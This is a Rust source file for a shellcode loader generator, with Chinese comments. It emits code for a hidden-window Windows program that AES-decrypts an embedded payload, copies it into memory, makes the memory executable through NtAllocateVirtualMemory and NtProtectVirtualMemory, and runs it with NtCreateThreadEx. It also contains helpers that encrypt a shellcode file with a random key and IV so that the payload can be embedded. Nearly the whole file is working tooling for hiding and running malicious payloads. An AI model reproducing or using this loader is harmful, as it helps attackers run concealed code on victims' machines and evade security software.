#![allow(warnings)]
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use base64::{decode, encode};
use rand_core::{OsRng, RngCore};
use std::fs;
use std::fs::File;
use std::io;
use std::io::prelude::*;
use std::u8;

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

use std::io::{BufRead, BufReader, Read};

pub fn maincargo() -> String {
    format!(
        r#"
winapi = {{version = "0.3.9", features = ["psapi", "processthreadsapi","winnt","winbase", "impl-default", "memoryapi", "winuser", "wincon", "winbase"]}}
ntapi = "0.4.0"
winproc = "0.6.4"
cbc = "0.1.2"
rand_core = {{ version = "0.6", features = ["std"] }}
aes = "0.8"
base64 = "0.21.0"
rand = "0.8"
generic-array = "0.14.4"
typenum = "1.14.0"
pelite = "0.9.1"
[profile.release]
panic = "abort"
lto = true
incremental = false
debug = false"#
    )
}

pub fn aesdecryption() -> String {
    format!(
        r#"fn decrypt() -> Vec<u8> {{
        unsafe {{
            let cipher = base64::decode(&ciphertext).unwrap();
            let key_var = base64::decode(&key).unwrap();
            let iv_var = base64::decode(&iv).unwrap();
            let cipher_len = cipher.len();
            let mut buf = [0u8;  0x50000];
            buf[..cipher_len].copy_from_slice(&cipher);
            let pt = Aes128CbcDec::new_from_slices(&key_var, &iv_var).expect("error")
                .decrypt_padded_b2b_mut::<Pkcs7>(&cipher, &mut buf)
                .unwrap();
        
            pt.to_vec()
        }}
    }}
    "#
    )
}

pub fn main_imports() -> String {
    format!(
        r#"#![allow(warnings)]
#![windows_subsystem = "windows"]
use ntapi::ntmmapi::{{NtAllocateVirtualMemory,NtWriteVirtualMemory, NtProtectVirtualMemory}};
use ntapi::ntpsapi::{{NtCurrentProcess,NtCreateThreadEx}};
use ntapi::ntobapi::NtWaitForSingleObject;
use winapi::um::winnt::MAXIMUM_ALLOWED;
use winapi::ctypes::c_void;
use std::ptr;
use base64::{{decode,encode}};
use aes::cipher::{{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit}};
use rand_core::{{OsRng, RngCore}};
type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
use std::fs::File;
use std::io::{{self, Read, BufReader, BufRead}};
use std::u8;
use std::io::prelude::*;
use std::fs;
"#
    )
}

pub fn ntloader() -> String {
    format!(
        r#"fn ntloader() -> (){{
        unsafe {{
            let mut s = decrypt();
            let mut base_address : *mut c_void = ptr::null_mut();
            let mut sellcode_length: usize =  s.len().try_into().unwrap();
            let mut temp = 0;
            NtAllocateVirtualMemory(NtCurrentProcess,&mut base_address,0, &mut s.len(), 0x00003000, 0x40);
            NtWriteVirtualMemory(NtCurrentProcess,base_address,s.as_ptr() as _,s.len() as usize,ptr::null_mut());
            NtProtectVirtualMemory(NtCurrentProcess, &mut base_address, &mut sellcode_length,  0x20, &mut temp);
            let mut thread_handle : *mut c_void = std::ptr::null_mut();
            NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, base_address, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
    }}
}}
    "#
    )
}

pub fn main_() -> String {
    format!(
        r#"fn main(){{
        ntloader()  
    }}
    "#
    )
}

pub fn read_bin(file_name: &str) -> Vec<u8> {
    if let Ok(buffer) = fs::read(file_name) {
        buffer
    } else {
        println!("读取文件失败: {}", file_name);
        Vec::new() // 或者根据需要返回一个默认值
    }
}

pub fn encrypt(plain: &[u8], iv_var: &[u8], key_var: &[u8]) -> Vec<u8> {
    let mut buf = [0u8; 0x50000];
    let pt_len = plain.len();
    buf[..pt_len].copy_from_slice(plain);
    let ct = Aes128CbcEnc::new_from_slices(&key_var, &iv_var)
        .expect("error")
        .encrypt_padded_b2b_mut::<Pkcs7>(plain, &mut buf)
        .unwrap();
    ct.to_vec()
}

/// 生成随机 iv
pub fn generate_iv() -> [u8; 16] {
    let mut rng = OsRng;
    let mut bytes = [0u8; 16];
    rng.fill_bytes(&mut bytes);

    bytes
}
// 加密shellcode
pub fn encipher_bin(buffer: &[u8]) -> (String, String, String) {
    let iv = generate_iv();
    let key = generate_iv();
    let ret = encrypt(buffer, &iv, &key);
    let base64_encoded = base64::encode(&ret);
    let iv_base64 = base64::encode(&iv);
    let key_base64 = base64::encode(&key);
    (base64_encoded, iv_base64, key_base64)
}
